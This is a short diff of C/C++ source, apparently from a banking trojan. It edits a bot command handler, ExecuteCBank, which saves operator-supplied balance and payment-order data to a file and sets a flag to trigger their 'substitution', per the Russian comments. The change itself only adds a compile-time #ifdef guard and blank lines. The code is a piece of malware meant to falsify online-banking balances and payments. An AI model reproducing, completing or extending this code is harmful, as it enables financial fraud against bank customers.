@@ -1193,16 +1193,20 @@ bool ExecuteAddTrust(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+
 bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
+    #ifdef BBSCBankH
 	TASKDBG( "CBank", "%s", Args );
 	int c_args = m_lstrlen(Args);
 	//сохраняем переданный баланс и платежки
 	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), Args, c_args + 1 );
 	//уставливаем флаг для запуска подмены
 	Bot->CreateFileA( 0, GetStr(CBankFlagUpdate).t_str() );
+	#endif
 	return true;
 }
+
 
 /*
 
